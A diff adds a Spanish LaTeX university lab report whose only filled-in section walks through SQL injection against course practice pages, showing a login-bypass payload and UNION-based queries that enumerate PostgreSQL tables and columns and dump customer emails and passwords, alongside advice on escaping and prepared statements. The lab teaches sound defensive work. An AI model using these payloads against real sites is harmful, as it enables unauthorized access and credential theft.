@@ -1,0 +1,125 @@
+\documentclass{article}
+\usepackage[T1]{fontenc}
+\usepackage[utf8x]{inputenc}
+\usepackage[spanish]{babel}
+\usepackage{graphicx}
+\usepackage{hyperref}
+\usepackage[left=3cm, right=2cm, top=3cm, bottom=2cm]{geometry}
+\usepackage{fancyvrb}
+\usepackage{xcolor}
+
+\hypersetup{
+	hyperindex,
+    colorlinks,
+    allcolors=blue!60!black
+}
+
+\title{Práctica 4 SI}
+\date{\today}
+\author{Guillermo Julián Moreno \and Víctor de Juan Sanz}
+\newcommand{\eqdef}{\stackrel{{\scriptsize\rm def}}{=}}
+
+\begin{document}
+\maketitle
+
+\section{Optimización}
+
+\subsection{Estudio del impacto de un índice}
+
+\subsection{Estudio del impacto de preparar sentencias SQL}
+
+\subsection{Estudio del impacto de cambiar la forma de realizar una consulta}
+
+\subsection{Estudio del impacto de la generación de estadísticas}
+
+\section{Transacciones y \textit{deadlocks}}
+
+\subsection{Transacciones}
+
+\subsection{Estudio de bloqueos y \textit{deadlocks}}
+
+\section{Seguridad}
+
+\subsection{Acceso indebido a un sitio web}
+
+Para acceder al sistema como el usuario \textit{gatsby}, simplement introducimos ese nombre en el campo de usuario y, en contraseña, introducimos \texttt{' OR 1=1; {-}-}. Aprovechamos así el fallo de programación en \textit{xLoginInjection.php}, de tal forma que el código realizará la consulta siguiente
+
+\begin{Verbatim}[frame = lines]
+SELECT * FROM customers WHERE username='gatsby' AND password='' OR 1 = 1; --
+\end{Verbatim}
+
+Es decir, siempre será válida y sacará al menos un registro. El código PHP dará por válido el \textit{login} y entraremos sin saber la contraseña.
+
+La misma técnica se puede usar para entrar sin saber el nombre de usuario: al usar la cláusula \texttt{OR}, no es siquiera necesario que el nombre de usuario esté en la base de datos, ya que \texttt{1=1} es una condición que siempre es verdadera para cualquier registro.
+
+Para evitar este tipo de ataques, se debe escapar las cadenas que vengan desde el cliente con \texttt{pg\_escape\_string} o bien usar la clase \textit{PDO} con \texttt{prepare}, que automáticamente realiza el escape necesario. Así impediremos que en las cadenas que introduce el usuario haya caracteres que puedan modificar el comportamiento de nuestra consulta SQL.
+
+\subsection{Acceso indebido a información}
+
+Partiendo de la base de inyecciones SQL del apartado anterior, hemos ido realizando el siguiente proceso, introduciendo varias cadenas en el campo de búsqueda de \textit{xSearchInjection.php}
+
+Empezamos con una prueba sencilla: ver que efectivamente el campo de búsqueda es vulnerabble a inyecciones SQL con \texttt{2000' OR columna\_anio = '2005'}. Los resultados son películas de los años 2000 y 2005, así que efectivamente es vulnerable.
+
+El siguiente paso es ver qué tablas existen en la base de datos, y para ello hay que acceder a la tabla \texttt{pg\_class}. Por simplificar, no sacamos todas las relaciones sino sólo las claves primarias. Esto nos da una pista rápida sobre las tablas importantes y nos permite evitar el paso adicional de buscar el \textit{oid} del esquema público de PostgreSQL.
+
+Usamos para ello el siguiente comando.
+
+\begin{Verbatim}[frame = lines]
+2000' AND 0=1 UNION SELECT relname AS movietitle FROM pg_class
+	WHERE relname  LIKE '%_pkey';--
+\end{Verbatim}
+
+Añadimos \texttt{AND 0 = 1} para evitar que apareciesen resultados de películas, y después usamos el operador \texttt{UNION} para concatenar los resultados de la consulta que queremos hacer en realidad. El resultado de esa consulta fue el siguiente:
+
+\begin{Verbatim}
+    customers_pkey
+    orders_pkey
+    imdb_movielanguages_pkey
+    imdb_actormovies_pkey
+    products_pkey
+    imdb_actors_pkey
+    imdb_directors_pkey
+    imdb_moviegenres_pkey
+    imdb_movies_pkey
+    imdb_moviecountries_pkey
+    imdb_directormovies_pkey
+    inventory_pkey
+\end{Verbatim}
+
+Aquí vimos que probablemente la tabla \texttt{customers}, asociada a la clave primaria \texttt{customers\_pkey}, es la que nos interesaba. Confirmamos que esa tabla existía y obtenemos su \textit{oid} con
+
+\begin{Verbatim}[frame = lines]
+2000' AND 0=1 UNION SELECT oid || ',' || relname AS movietitle
+	FROM pg_class WHERE RELNAME='customers';--
+\end{Verbatim}
+
+La salida \texttt{30345,customers} nos confirma que la tabla existe y nos da su \textit{oid}, con lo que podemos encontrar sus columnas. Para ello usamos la siguiente cadena
+
+\begin{Verbatim}[frame = lines]
+2000' AND 0=1 UNION SELECT attname AS movietitle
+	FROM pg_attribute WHERE attrelid=30345;--
+\end{Verbatim}
+
+Obtenemos así todas las columnas, y vemos dos que nos interesan: \texttt{email} y \texttt{password}. El último paso es obtener los correos y contraseñas de todos los clientes de la web:
+
+\begin{Verbatim}[frame = lines]
+2000' AND 0=1 UNION SELECT email || ',' || password AS movietitle FROM customers;--
+\end{Verbatim}
+
+Los resultados fueron suficientes:
+
+\begin{Verbatim}
+    aachen.aleppo@mamoot.com,snyder
+    aaron.ripper@potmail.com,slob
+    abaci.zibo@potmail.com,ebro
+    aback.soar@potmail.com,jelly
+    abacus.argosy@potmail.com,helmut
+    abaft.viand@potmail.com,pony
+    abase.jul@kran.com,dioxin
+    ...
+\end{Verbatim}
+
+En cuanto a las preguntas planteadas en el enunciado, de ninguna de las dos formas propuestas se podría resolver el problema: debe ser modificado en el código PHP como explicábamos en el apartado anterior. En cualquiera de los dos casos se podría seguir enviando la cadena de búsqueda que se quisiese usando herramientas especializadas, como los comandos de terminal \texttt{curl} o \texttt{wget} o la extensión \href{https://addons.mozilla.org/En-us/firefox/addon/httprequester/}{HTTPRequester} de Firefox, que permiten realizar peticiones GET o POST con los parámetros que quiera el usuario.
+
+
+\end{document}
